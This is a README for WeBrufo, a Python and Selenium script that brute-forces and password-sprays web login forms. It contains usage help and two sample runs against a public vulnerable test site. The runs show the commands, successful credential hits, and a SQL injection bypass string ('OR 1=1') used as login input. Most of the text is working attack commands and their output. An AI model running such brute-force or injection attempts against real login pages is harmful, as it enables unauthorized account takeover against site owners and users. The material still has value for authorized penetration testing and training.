# WeBrufo (WEb BRUte-FOrcer)

## Table of Contents

* [Introduction](#Introduction)
* [Dependencies](#Dependencies)
* [Usage](#Usage)



## Introduction
A simple script to bruteforce web forms. Uses CSS selector to locate the inputs and perform bruteforce. Both credential bruteforce and spraying can be performed using this script. The script is inspired from <a href="https://github.com/maximousblk/callow">Callow</a>. This script works on <b>most</b> of the web forms with any number of inputs, provided the input css selector are passed in the argument. 

And as for the name, I was too lazy to think and come up with some cool name...

## Dependencies
The script primarily requires python (obviously) and Selenium to start a headless browser session and perform the bruteforce. Can be installed using  
``` python
pip install selenium
```
## Usage
```bash
    __      __      ___.                 _____       
    /  \    /  \ ____\_ |_________ __ ___/ ____\____  
    \   \/\/   // __ \| __ \_  __ \  |  \   __\/  _ \ 
     \        /\  ___/| \_\ \  | \/  |  /|  | (  <_> )
      \__/\  /  \___  >___  /__|  |____/ |__|  \____/ 
           \/       \/    \/                          
    
usage: webrufo.py [-h] [-p PARAMS [PARAMS ...]] [-c CONST [CONST ...]] [--count COUNT]
                  [--submit SUBMIT] [--resume] [-u URL] [-d]

Bruteforce web form fields.

options:
  -h, --help            show this help message and exit
  -p PARAMS [PARAMS ...], --params PARAMS [PARAMS ...]
                        HTTP parameters -p '#username'=username.txt '#password'=password.txt
  -c CONST [CONST ...], --const CONST [CONST ...]
                        Constant parameters. Syntax same as for --params. Useful for Null payload
                        bruteforce/Password spraying etc.
  --count COUNT         Count of null payloads. To be used when only constant parameters are
                        passed. Usefull for null payload bruteforce.
  --submit SUBMIT       Optional argument to pass CSS selector for submit button
  --resume              Optional parameter to continue even after getting valid credentials
  -u URL, --url URL     Target URL
  -d, --debug           Print debug information
```


The basic command to run the script is
```bash
/webrufo> python webrufo.py -u http://testphp.vulnweb.com/login.php -p '#content > div:nth-child(1) > form > table > tbody > tr:nth-child(1) > td:nth-child(2) > input[type=text]'::file.txt '#content > div:nth-child(1) > form > table > tbody > tr:nth-child(2) > td:nth-child(2) > input[type=password]'::file.txt --resume

     __      __      ___.                 _____       
    /  \    /  \ ____\_ |_________ __ ___/ ____\____  
    \   \/\/   // __ \| __ \_  __ \  |  \   __\/  _ \ 
     \        /\  ___/| \_\ \  | \/  |  /|  | (  <_> )
      \__/\  /  \___  >___  /__|  |____/ |__|  \____/ 
           \/       \/    \/                          
    
Initiating bruteforce attack
Tried: ['test', 'test']                           
Bruteforce successful. Credential combination: ['test', 'test']
Tried: ["' OR 1=1-- -", "' OR 1=1-- -"]                         
Bruteforce successful. Credential combination: ["' OR 1=1-- -", "' OR 1=1-- -"]
Tried: ['azureuser', 'azureuser']                                 
Attack completed!!
```

The script usage with constant parameters are:
```bash
/webrufo> python webrufo.py -u http://testphp.vulnweb.com/login.php -p '#content > div:nth-child(1) > form > table > tbody > tr:nth-child(1) > td:nth-child(2) > input[type=text]'::file.txt -c '#content > div:nth-child(1) > form > table > tbody > tr:nth-child(2) > td:nth-child(2) > input[type=password]'::testpassword --resume

     __      __      ___.                 _____       
    /  \    /  \ ____\_ |_________ __ ___/ ____\____  
    \   \/\/   // __ \| __ \_  __ \  |  \   __\/  _ \ 
     \        /\  ___/| \_\ \  | \/  |  /|  | (  <_> )
      \__/\  /  \___  >___  /__|  |____/ |__|  \____/ 
           \/       \/    \/                          
    
Initiating bruteforce attack
Tried: ["' OR 1=1-- -", 'testpassword']                         
Bruteforce successful. Credential combination: ["' OR 1=1-- -", 'testpassword']
Tried: ['azureuser', 'testpassword']                             
Attack completed!!
```

